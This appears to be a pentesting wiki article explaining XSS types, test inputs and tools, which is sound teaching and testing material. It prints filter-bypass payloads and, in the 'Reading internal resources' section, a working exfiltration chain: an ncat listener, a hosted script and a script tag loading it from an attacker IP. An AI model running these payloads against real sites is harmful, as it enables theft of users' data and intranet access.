---
authors: ShutdownRepo
category: web
---

# XSS (Cross-Site Scripting)

## Theory

Many web applications have input vectors that users can interact with. When those inputs are reflected in the content of a page and not sanitized or filtered enough, attackers can try to inject malicious code to alter that page. The most common attacks that exploit such vulnerabilities are XSS (Cross-Site Scripting) and defacement attacks. While this kind of defacement only alters the visual appearance of a website, an XSS can allow attackers to inject code/scripts (JavaScript for example) that will be executed by victims browsers, hence causing much more trouble to the users.

Executing arbitrary code on a victim's browser can allow an attacker to perform Cookie theft (when the cookies are not secured, attackers can steal them and use them to authenticate as the victims without having to know their password), Keylogging (attackers can spy on the victims and recover their keystrokes) or Phishing (attackers can change the site appearance and behavior and trick victims into sending sensitive information to the attackers servers).

There are three major types of XSS:

* Stored: the user input is stored on the website. It usually happens on user profiles, forums, chats and so on where the user content is permanently (or temporarily) stored. Attackers can inject malicious payloads and every user browsing the infected page will be affected. This is one of the most dangerous forms of XSS because exploitation requires no phishing and it can affect many users. XSS on pages that only the attacker's user has the right to browse (e.g. user settings page) are called self-XSS and are considered to have a close to 0 impact since it theoretically can't affect other users.
* Reflected: the user input is reflected but not stored. It usually happens on search forms, login pages and pages that reflect content for one response only. When the reflected vulnerable input is in the URI (`http://www.target.com/search.php?keyword=INJECTION`) attackers can craft a malicious URI and send it to the victims hoping they will browse it. This form of XSS usually requires phishing and attackers can be limited in the length of the malicious payload (cf. [this](https://serpstat.com/blog/how-long-should-be-the-page-url-length-for-seo/)).
* DOM-based: while stored and reflected XSS attacks exploit vulnerabilities in the server-side code, a DOM-based XSS exploits client-side ones (e.g. JavaScript used to help dynamically render a page). DOM-based XSS usually affect user inputs that are temporarily reflected, just like reflected XSS attacks.

## Practice

Testers need to identify input vectors (parts of the app that accept content from the users) that are stored or reflected.

* URI parameters for reflected and DOM-based XSS
* Other user inputs in forums, chats, comments, posts, and other stored content for stored XSS
* HTTP headers like Cookies (and even User-Agents in some cases)

One of the most famous payloads is `<script>alert('XSS');</script>` opening a pop-up window echoing "XSS". However, exploiting XSS is like playing "cat and mouse". Inputs can be filtered and filters can be bypassed. Here are some basic examples of XSS payloads.

```
<script>alert('XSS');</script>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG onmouseover="alert('XSS')">
<<SCRIPT>alert("XSS");//<</SCRIPT>
```

The following [website](https://transformations.jobertabma.nl/) ([GitHub project](https://github.com/jobertabma/transformations)) can help identify transformations applied to user inputs. This can help bypass filters and transformations to exploit XSS attacks.

The following payload is used for testing [SQL injections](sqli.md), XSS (Cross-Site Scripting) and [SSTI (Server-Side Template Injection)](ssti.md).

```
'"<svg/onload=prompt(5);>{{7*7}}
```

Tools like [XSStrike](https://github.com/s0md3v/XSStrike) (Python), [XSSer](https://github.com/epsylon/xsser) (Python), and [Dalfox](https://github.com/hahwul/dalfox) (Go) can also help in finding and exploiting XSS vulnerable input vectors by fuzzing them with unique payloads and then searching for unique patterns in the responses.

### Reading internal resources

An XSS is not limited to `alert()` or cookie theft. The injected script runs inside the victim's browser, which can often reach services the attacker cannot reach directly (e.g. an admin panel or an API listening on `127.0.0.1`, or an intranet host). The script can request an internal URL and send the response back to the attacker.

[myexfilxss](https://github.com/hack-ita/xss-internal-exfil-poc) is a minimal JavaScript PoC doing exactly that. It reads the internal URL as raw bytes (so html, json, archives or binaries are not corrupted), encodes the response in base64, and sends it back in a single `POST` with `Content-Type: text/plain` (a "simple request", so no CORS preflight is triggered).

First, set the internal URL to read (`uri` variable) and the attacker's IP (`exfil.open(...)` line) in `myexfilxss.js`. Then start a listener and host the script on another port.

```bash
# Listener receiving the exfiltrated data
sudo ncat -klvnp 80

# Host the script (port 80 is already used by the listener)
python3 -m http.server 8000
```

The script can then be loaded through the XSS (e.g. in a field or header that gets rendered to another user).

```html
<script src="http://$ATTACKER_IP:8000/myexfilxss.js"></script>
```

The base64 data is the body of the `POST` request received by the listener, and can be decoded with `base64 -d`.

```bash
echo '$BASE64_BODY' | base64 -d > response.bin
```

> [!WARNING]
> The browser still enforces its security policies. Reading a cross-origin response requires the internal service to be same-origin or to allow it with CORS headers (e.g. `Access-Control-Allow-Origin`), and a restrictive CSP or mixed content (an HTTPS page requesting an HTTP URL) can block the requests. The internal service must also answer a plain `GET` without authentication or additional headers.

## Resources

[https://xss-game.appspot.com/](https://xss-game.appspot.com/)

[https://excess-xss.com/](https://excess-xss.com/)

[https://owasp.org/www-community/attacks/DOM_Based_XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

[https://en.hackita.it/articoli/xss/](https://en.hackita.it/articoli/xss/)

[https://github.com/hack-ita/xss-internal-exfil-poc](https://github.com/hack-ita/xss-internal-exfil-poc)
